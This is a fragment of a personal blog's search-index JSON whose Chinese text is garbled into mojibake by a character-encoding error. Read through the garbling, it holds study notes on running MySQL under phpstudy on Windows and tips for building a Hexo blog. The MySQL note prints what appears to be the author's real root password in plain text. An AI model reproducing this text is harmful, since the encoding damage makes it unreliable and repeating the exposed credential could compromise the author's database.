æ—¶åº”è¯¥åŒæ—¶ä¿®æ”¹ç½‘å€çš„æ ¹ç›®å½•ä¸‹å¯¹åº”æ–‡ä»¶ä¸­çš„å¯†ç ã€‚å¦‚sql-connectionsæ–‡ä»¶ä¸­ã€‚ MYSQLæ•°æ®åº“çš„ä½¿ç”¨1.åœ¨D:\\phpstudy_pro\\Extensions\\MySQL5.7.26\\binç›®å½•ä¸‹æ‰“å¼€ï¼Œè¾“å…¥è¯­å¥./mysql.exe -uroot -pï¼› 2.è·³å‡ºè¯­å¥è®©ä½ è¾“å…¥å¯†ç ï¼ˆlcj20020425ï¼‰ï¼› 3.è¾“å…¥æŸ¥è¯¢è¯­å¥ï¼Œè¯­å¥ä»¥ï¼›ç»“å°¾ã€‚","tags":[{"name":"MySQLæ•°æ®åº“çš„æ­å»ºä¸å¯åŠ¨","slug":"MySQLæ•°æ®åº“çš„æ­å»ºä¸å¯åŠ¨","permalink":"http://example.com/tags/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%90%AD%E5%BB%BA%E4%B8%8E%E5%90%AF%E5%8A%A8/"}]},{"title":"","date":"2020-10-01T13:32:41.724Z","path":"2020/10/01/blog1/","text":"title: â€œæ­å»ºçš„åšå®¢â€date: 2020-10-01 21:32:41tags:description:1.ç”¨git bashè¿›è¡Œhexo initæŒ‡ä»¤æ—¶ä¸€å®šè¦è®¤æ¸…æ¥šæ–‡ä»¶å¤¹ï¼Œæ˜¯å¯¹hexoæ–‡ä»¶å¤¹è¿›è¡Œæ ¼å¼åŒ–ï¼Œæˆ‘åˆšåˆšå¼€å§‹åšçš„æ—¶å€™å¯¹blogæ–‡ä»¶å¤¹ä¸€ç›´åšæ ¼å¼åŒ–å¯¼è‡´è€—è´¹äº†å¾ˆä¹…æ—¶é—´2.åœ¨å¤åˆ¶ä¸ªäººgithubåœ°å€åç²˜è´´åœ¨congigæ—¶å¯èƒ½ä¼šæ··æ‚è®¸å¤šç©ºæ ¼ï¼Œè¿™äº›ç©ºæ ¼ä¼šå½±å“ä½ æ‰§è¡Œhexo dæŒ‡ä»¤ï¼Œä¹Ÿå°±æ˜¯è¯´æ— æ³•å°†æœ¬åœ°æ–‡ä»¶éƒ¨ç½²åˆ°ä¸ªäººç½‘é¡µä¸Š 3.ç”Ÿäº§æ–°åšå®¢ï¼šhexo new blogx 4.å†™blogçš„æ—¶å€™è¦ä½¿ç”¨ç¼–ç UTF-8,å¦åˆ™ä¼ è¾“åˆ°hexoç½‘é¡µä¸Šä¼šæ˜¾ç¤ºä¹±ç  5.ç”¨hexo gï¼›hexo dæŒ‡ä»¤ä¸Šä¼ åšå®¢æ—¶è¦åœ¨**hexoæ–‡ä»¶**ä¸‹å»ºç«‹çš„hexo bashä¸­è¾“å…¥ã€‚","tags":[]}]